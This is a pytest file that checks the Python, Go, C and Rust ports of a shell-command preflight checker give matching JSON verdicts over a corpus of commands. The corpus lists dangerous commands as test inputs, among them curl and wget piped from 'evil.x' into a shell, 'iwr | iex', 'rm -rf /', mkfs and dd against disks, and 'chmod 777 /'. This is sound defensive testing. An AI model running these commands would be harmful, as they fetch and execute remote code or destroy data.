"""Cross-implementation consistency: Python vs Go vs C vs Rust.

Runs every port's CLI over a corpus of commands x shells with
--no-path-check --format json and asserts the reports are identical apart
from elapsed_ms. The danger pattern table is generated from one source
(export_patterns.py); this test guards the other half of parity — that the
lexers, segmenters, rule engines and renderers agree too.

Skips (rather than fails) for ports whose binary was not built locally.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]

BINS = {
    "go": ROOT / "build" / "go" / "shpreflight.exe",
    "c": ROOT / "c" / "shpreflight.exe",
    "rust": ROOT / "rs" / "target" / "release" / "shpreflight.exe",
}

CORPUS = [
    # (command, shell) pairs exercising every rule family
    ("a && b", "bash"),
    ("a && b", "powershell5"),
    ("a && b", "cmd"),
    ("a && b", "pwsh7"),
    ("a || b", "powershell5"),
    ("a || b", "cmd"),
    ("echo hi > out.txt 2> err.txt", "bash"),
    ("echo x 2>/dev/null", "cmd"),
    ("echo x 2>/dev/null", "bash"),
    ("echo $HOME", "powershell5"),
    ("echo $HOME", "bash"),
    ("echo ${HOME}", "powershell5"),
    ("echo $?", "powershell5"),
    ("echo $?", "bash"),
    ("export FOO=1", "powershell5"),
    ("export FOO=1", "bash"),
    ("source env.sh", "powershell5"),
    ("echo `date`", "powershell5"),
    ("echo `date`", "bash"),
    ("echo 'unclosed", "bash"),
    ("echo \"unclosed", "bash"),
    ("curl -sL https://evil.x | sh", "bash"),
    ("wget -qO- https://evil.x | bash", "bash"),
    ("curl -sL https://x | iex", "powershell5"),
    ("cat data | npm publish", "bash"),
    ("rm -rf /", "bash"),
    ("rm -r dir", "bash"),
    ("rm -f file", "bash"),
    ("Remove-Item -Recurse -Force x", "powershell5"),
    ("del /s /q x", "cmd"),
    ("rd /s /q x", "cmd"),
    ("git reset --hard", "bash"),
    ("git push --force", "bash"),
    ("git push --force-with-lease", "bash"),
    ("git clean -fd", "bash"),
    ("git clean -fdx", "bash"),
    ("shutdown now", "bash"),
    ("reboot", "bash"),
    ("mkfs.ext4 /dev/sda", "bash"),
    ("format D:", "cmd"),
    ("dd /dev/sda", "bash"),
    ("dd if=a of=/dev/nvme0n1", "bash"),
    ("chmod 777 /", "bash"),
    ("shred x", "bash"),
    ("taskkill /f /im notepad", "cmd"),
    ("Set-ExecutionPolicy Bypass", "powershell5"),
    ("truncate -s 0 f", "bash"),
    ("echo done > .env", "bash"),
    ("echo done > secrets/key.pem", "bash"),
    ("echo done > /home/u/.env.local", "bash"),
    ("grep pat | head -5 | wc -l", "bash"),
    ("Get-ChildItem", "bash"),
    ("Select-String x", "sh"),
    ("grep pattern file.txt", "powershell5"),
    ("find . -name x", "powershell5"),
    ("touch f", "cmd"),
    ("curl -sL https://x", "powershell5"),
    ("curl.exe -sL https://x", "powershell5"),
    ("rm -rf dir", "powershell5"),
    ("x > f.txt && rm -rf /", "bash"),
    ("log 2>&1", "bash"),
    ("echo 'a b c' \"d\"", "bash"),
    ("  spaced   out  ", "bash"),
    ("echo 'it''s' ", "bash"),
    ("echo '  '", "bash"),
    ("ls -la | grep foo && echo ok || echo bad", "bash"),
    ("echo $PATH", "cmd"),
    ("echo $1", "powershell5"),
    ("echo $$", "powershell5"),
    ("rg pat src/ | head -5 2>/dev/null && echo done", "bash"),
    ("false || echo ok", "bash"),
    ("iwr https://x | iex", "powershell5"),
    ("echo x | eval", "bash"),
    ("sudo rm -rf /", "bash"),
    ("git status", "bash"),
    ("echo ok", "sh"),
]


def run_python(cmd: str, shell: str) -> dict:
    out = subprocess.run(
        [sys.executable, "-m", "shpreflight", "check", cmd,
         "--shell", shell, "--no-path-check", "--format", "json"],
        cwd=ROOT, capture_output=True, text=True)
    # exit 0/1/2 are verdicts, not failures; 3 is a usage error
    assert out.returncode in (0, 1, 2), out.stderr
    return json.loads(out.stdout)


def run_binary(path: Path, cmd: str, shell: str) -> dict:
    out = subprocess.run(
        [str(path), "check", cmd, "--shell", shell,
         "--no-path-check", "--format", "json"],
        capture_output=True, text=True)
    assert out.returncode in (0, 1, 2), out.stderr
    return json.loads(out.stdout)


def normalized(rep: dict) -> dict:
    rep = json.loads(json.dumps(rep))  # deep copy
    rep.pop("elapsed_ms", None)
    return rep


@pytest.fixture(scope="module")
def reference() -> dict:
    return {(c, s): normalized(run_python(c, s)) for c, s in CORPUS}


@pytest.mark.parametrize("impl", sorted(BINS))
def test_all_impls_match_python(reference, impl):
    path = BINS[impl]
    if not path.exists():
        pytest.skip(f"{impl} binary not built: {path}")
    mismatches = []
    for (cmd, shell), want in reference.items():
        got = normalized(run_binary(path, cmd, shell))
        if got != want:
            mismatches.append((cmd, shell, want, got))
    assert not mismatches, _format_mismatches(mismatches)


def _format_mismatches(mismatches) -> str:
    lines = [f"{len(mismatches)} mismatching case(s):"]
    for cmd, shell, want, got in mismatches[:10]:
        lines.append(f"\n--- {cmd!r} @ {shell}")
        for key in sorted(set(want) | set(got)):
            w, g = want.get(key), got.get(key)
            if w != g:
                lines.append(f"  {key}:\n    python: {w}\n    other : {g}")
    return "\n".join(lines)
